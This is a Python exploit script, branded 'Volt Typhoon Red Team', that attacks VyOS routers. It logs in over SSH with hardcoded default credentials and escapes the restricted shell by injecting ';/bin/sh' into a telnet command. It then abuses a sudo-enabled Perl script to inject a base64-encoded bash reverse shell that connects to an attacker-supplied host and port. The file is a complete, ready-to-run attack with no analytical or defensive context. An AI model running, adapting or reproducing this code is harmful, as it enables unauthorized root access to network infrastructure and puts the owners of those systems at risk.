import base64
import paramiko
import time
import argparse

RPORT = 22
USERNAME = 'vyos'
PASSWORD = 'Pa$$w0rd'

ascii_art = r'''
\.          |\
   \`.___---~~  ~~~--_
   //~~----___  (_o_-~
  '           |/'

__     __    _ _     _____            _                       
\ \   / /__ | | |_  |_   _|   _ _ __ | |__   ___   ___  _ __  
 \ \ / / _ \| | __|   | || | | | '_ \| '_ \ / _ \ / _ \| '_ \ 
  \ V / (_) | | |_    | || |_| | |_) | | | | (_) | (_) | | | |
   \_/ \___/|_|\__|   |_| \__, | .__/|_| |_|\___/ \___/|_| |_|
                          |___/|_|                            

              VOLT TYPHOON RED TEAM
'''

def main():
    print(ascii_art)

    parser = argparse.ArgumentParser(description="VyOS Privilege Escalation Exploit - Volt Typhoon Edition")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-lhost", "--localhost", required=True, help="Localhost IP for reverse shell")
    parser.add_argument("-lport", "--localport", required=True, help="Local port for reverse shell")
    args = parser.parse_args()

    RHOST = args.target
    LHOST = args.localhost
    LPORT = args.localport

    payload_cmd = f"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
    payload_b64 = base64.b64encode(payload_cmd.encode()).decode()

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print(f"[+] Connecting to {RHOST}:{RPORT} as {USERNAME} ...")
    ssh.connect(RHOST, port=RPORT, username=USERNAME, password=PASSWORD, look_for_keys=False, allow_agent=False)
    print("[+] Connected.")

    chan = ssh.invoke_shell()
    time.sleep(1)

    output = chan.recv(65535).decode('utf-8').lower()
    print("[*] Initial shell output:")
    print(output)

    if 'vyos' not in output:
        print("[-] Target does not appear to be VyOS.")
        ssh.close()
        return

    if '> ' in output:
        print("[*] Restricted shell detected. Attempting breakout...")
        chan.send("telnet ';/bin/sh'\n")
    elif '$ ' in output:
        print("[*] Unrestricted shell detected.")
        chan.send("/bin/sh\n")
    else:
        print("[-] Unexpected shell prompt. Exiting.")
        ssh.close()
        return

    time.sleep(2)
    output = chan.recv(65535).decode('utf-8')
    print("[*] After breakout attempt:")
    print(output)

    exploit_cmd = f"sudo /opt/vyatta/bin/sudo-users/vyatta-show-lldp.pl -action show-neighbor -i ';echo {payload_b64}|base64 -d|/bin/sh'\n"

    print("[*] Sending privilege escalation payload...")
    chan.send(exploit_cmd)

    print("[*] Payload sent. Check your listener for a reverse shell.")
    print("[*] Press Ctrl+C to exit.\n")

    try:
        while True:
            time.sleep(1)
            if chan.recv_ready():
                resp = chan.recv(4096).decode('utf-8')
                print(resp, end='')
    except KeyboardInterrupt:
        print("\n[*] Exiting.")
    finally:
        ssh.close()

if __name__ == "__main__":
    main()
